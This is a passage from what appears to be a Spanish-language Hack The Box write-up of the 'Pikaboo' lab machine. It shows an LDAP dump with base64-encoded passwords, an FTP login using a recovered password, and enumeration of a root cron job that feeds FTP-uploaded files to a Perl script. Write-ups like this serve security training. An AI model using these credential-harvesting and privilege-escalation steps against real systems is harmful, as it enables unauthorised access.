&lt;span class=&#34;c1&#34;&gt;# pwnmeow, users, ftp.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pwnmeow,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ftp,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt;
gidNumber: &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt;
homeDirectory: /home/pwnmeow
userPassword:: &lt;span class=&#34;nv&#34;&gt;X0cwdFQ0X0M0dGNIXyczbV80bEwhXw&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# binduser, users, pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;binduser,ou&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: &lt;span class=&#34;nv&#34;&gt;Sn40MiVXP1BGSGxdZw&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# users, pokeapi.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;users,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pokeapi,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: organizationalUnit
objectClass: top
ou: users

&lt;span class=&#34;c1&#34;&gt;# groups, pokeapi.pikaboo.htb&lt;/span&gt;
dn: &lt;span class=&#34;nv&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;groups,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pokeapi,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pikaboo,dc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;htb
objectClass: organizationalUnit
objectClass: top
ou: groups

&lt;span class=&#34;c1&#34;&gt;# search result&lt;/span&gt;
search: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
result: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Success

&lt;span class=&#34;c1&#34;&gt;# numResponses: 11&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# numEntries: 10&lt;/span&gt;
www-data@pikaboo:/opt/pokeapi/config$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con esta contraseÃ±a obtuvimos acceso por FTP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Ï€ ~/htb/pikaboo â¯ ftp 10.10.10.249 &lt;span class=&#34;c1&#34;&gt;# _G0tT4_C4tcH_&amp;#39;3m_4lL!_&lt;/span&gt;
Connected to 10.10.10.249.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.249:kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: pwnmeow
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwx-wx---    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 09:54 abilities
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
drwx-wx---    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;06&lt;/span&gt; 20:20 versions
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Descubrimos un cronjob ejecutado por root, utiliza &lt;code&gt;csvupdate&lt;/code&gt; para cada uno de los archivos en &lt;code&gt;/srv/ftp/&lt;/code&gt;, en este ultimo unicamente estan permitidos el usuario &lt;code&gt;root&lt;/code&gt; y los usuarios pertenecientes a &lt;code&gt;ftp&lt;/code&gt; como &lt;code&gt;pwnmeow&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@pikaboo:/$ cat /etc/crontab &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;SHELL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/sh
&lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; *    * * *   root    &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.hourly
&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;    * * *   root    &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.daily &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;    * * &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;   root    &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.weekly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; * *   root    &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.monthly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
* * * * * root /usr/local/bin/csvupdate_cron
www-data@pikaboo:/$ file /usr/local/bin/csvupdate_cron
/usr/local/bin/csvupdate_cron: Bourne-Again shell script, ASCII text executable
www-data@pikaboo:/$ cat /usr/local/bin/csvupdate_cron
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; d in /srv/ftp/*
&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt;
  /usr/local/bin/csvupdate &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;basename &lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; *csv
  /usr/bin/rm -rf *
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
www-data@pikaboo:/$ file /usr/local/bin/csvupdate
/usr/local/bin/csvupdate: Perl script text executable
www-data@pikaboo:/$  wc -l /usr/local/bin/csvupdate
&lt;span class=&#34;m&#34;&gt;231&lt;/span&gt; /usr/local/bin/csvupdate
www-data@pikaboo:/$ ls -ld /srv/ftp/
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;176&lt;/span&gt; root ftp &lt;span class=&#34;m&#34;&gt;12288&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 08:01 /srv/ftp/
www-data@pikaboo:/$ id pwnmeow
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pwnmeow&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pwnmeow&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pwnmeow&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,115&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ftp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
www-data@pikaboo:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El script realiza la lectura de archivos &lt;strong&gt;.csv&lt;/strong&gt; obtiene las celdas y verifica que tiene el numero de campos definidos en &lt;code&gt;%csv_fields&lt;/code&gt;, si es correcto finaliza escribiendo el contenido del &lt;code&gt;/srv/ftp/[archivo].csv&lt;/code&gt; en &lt;code&gt;/opt/pokeapi/data/v2/csv/[tipo].csv&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/perl&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  [... REDACTED ...]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;strict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;warnings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Text::CSV&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$csv_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/opt/pokeapi/data/v2/csv&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;%csv_fields&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;s&#34;&gt;&amp;#39;abilities&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  [... REDACTED ...]&lt;/span&gt;
  &lt;span class=&#34;s&#34;&gt;&amp;#39;versions&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$#ARGV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;die&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Usage: $0 &amp;lt;type&amp;gt; &amp;lt;file(s)&amp;gt;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$ARGV&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exists&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$csv_fields&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}){&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;die&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Unrecognised CSV data type: $type.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$csv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Text::CSV&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sep_char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;${csv_dir}/${type}.csv&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;gt;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;die&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Unable to open CSV target file.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;nb&#34;&gt;shift&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;chomp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$csv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;@fields&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$csv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fields&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@fields&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$csv_fields&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nb&#34;&gt;warn&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Incorrect number of fields: &amp;#39;$_&amp;#39;\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;$_\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nb&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
